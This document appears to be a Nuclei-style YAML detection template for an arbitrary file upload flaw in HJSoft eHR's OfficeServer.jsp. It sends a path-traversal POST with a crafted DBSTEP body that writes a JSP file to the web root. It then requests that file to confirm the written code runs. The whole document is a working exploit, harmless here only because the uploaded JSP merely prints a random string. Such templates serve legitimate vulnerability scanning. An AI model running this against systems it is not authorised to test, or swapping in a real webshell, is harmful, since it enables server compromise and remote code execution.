id: poc-yaml-hjsoft-ehr-officeserverjsp-anyfile-upload
info:
  name: HJSoft eHR OfficeServer.jsp Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload, vulnerability

variables:
  t1: "{{rand_base(6)}}"
  filename: "{{base64(concat('..\\', t1, '.jsp'))}}"
  content: "{{rand_base(18)}}"

flow: http(1) && http(2)

http:
  - id: upload-file
    method: POST
    path:
      - "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
    body: |
      DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
      OPTION=U0FWRUZJTEU=
      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
      FILETYPE={{filename}}
      RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
      originalFileId=wV66
      originalCreateDate=wUghPB3szB3Xwg66
      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
      needReadFile=yRWZdAS6
      originalCreateDate=wLSGP4oEzLKAz4=iz=66
      
      <%out.println("{{content}}");%>
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "DBSTEP"
      - type: word
        part: header
        words:
          - "text/html"

  - id: verify-upload
    method: GET
    path:
      - "/{{t1}}.jsp"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{content}}"
